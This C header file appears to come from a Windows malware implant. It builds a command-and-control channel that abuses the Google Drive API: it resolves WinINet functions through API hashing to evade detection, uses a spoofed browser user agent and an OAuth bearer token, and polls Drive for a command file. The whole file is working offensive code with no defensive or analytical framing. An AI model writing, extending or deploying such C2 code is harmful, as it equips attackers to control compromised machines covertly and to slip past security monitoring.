#ifndef GDRIVE_C2_H
#define GDRIVE_C2_H

#include <windows.h>
#include <wininet.h>
#include "api_hashes.h"

// Note: In a real scenario, these would be obfuscated or fetched dynamically
#define GDRIVE_HOST L"www.googleapis.com"
#define GDRIVE_API_URL L"/drive/v3/files"
#define AUTH_TOKEN L"Bearer YOUR_OAUTH_TOKEN_HERE"

typedef struct _GDRIVE_API {
    ULONG_PTR InternetOpenW;
    ULONG_PTR InternetConnectW;
    ULONG_PTR HttpOpenRequestW;
    ULONG_PTR HttpSendRequestW;
    ULONG_PTR InternetReadFile;
    ULONG_PTR InternetCloseHandle;
} GDRIVE_API;

static GDRIVE_API g_GDriveApi = {0};

static void InitGDriveApi() {
    HMODULE hWininet = LoadLibraryW(L"wininet.dll");
    if (!hWininet) return;

    g_GDriveApi.InternetOpenW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetOpenW);
    g_GDriveApi.InternetConnectW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetConnectW);
    g_GDriveApi.HttpOpenRequestW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_HttpOpenRequestW);
    g_GDriveApi.HttpSendRequestW = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_HttpSendRequestW);
    g_GDriveApi.InternetReadFile = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetReadFile);
    g_GDriveApi.InternetCloseHandle = (ULONG_PTR)ResolveApiByHash(hWininet, HASH_InternetCloseHandle);
}

static BOOL GDrive_CheckForCommands(char* buffer, DWORD bufferSize) {
    HINTERNET hInternet = ((HINTERNET(WINAPI *)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))g_GDriveApi.InternetOpenW)(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    HINTERNET hConnect = ((HINTERNET(WINAPI *)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR))g_GDriveApi.InternetConnectW)(hInternet, GDRIVE_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hInternet);
        return FALSE;
    }

    // Example: GET /drive/v3/files?q=name='cmd.txt'
    HINTERNET hRequest = ((HINTERNET(WINAPI *)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD, DWORD_PTR))g_GDriveApi.HttpOpenRequestW)(hConnect, L"GET", GDRIVE_API_URL, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hConnect);
        ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hInternet);
        return FALSE;
    }

    LPCWSTR headers = L"Authorization: " AUTH_TOKEN;
    BOOL sent = ((BOOL(WINAPI *)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD))g_GDriveApi.HttpSendRequestW)(hRequest, headers, (DWORD)-1, NULL, 0);

    if (sent) {
        DWORD bytesRead;
        ((BOOL(WINAPI *)(HINTERNET, LPVOID, DWORD, LPDWORD))g_GDriveApi.InternetReadFile)(hRequest, buffer, bufferSize - 1, &bytesRead);
        buffer[bytesRead] = '\0';
    }

    ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hRequest);
    ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hConnect);
    ((BOOL(WINAPI *)(HINTERNET))g_GDriveApi.InternetCloseHandle)(hInternet);

    return sent;
}

#endif // GDRIVE_C2_H
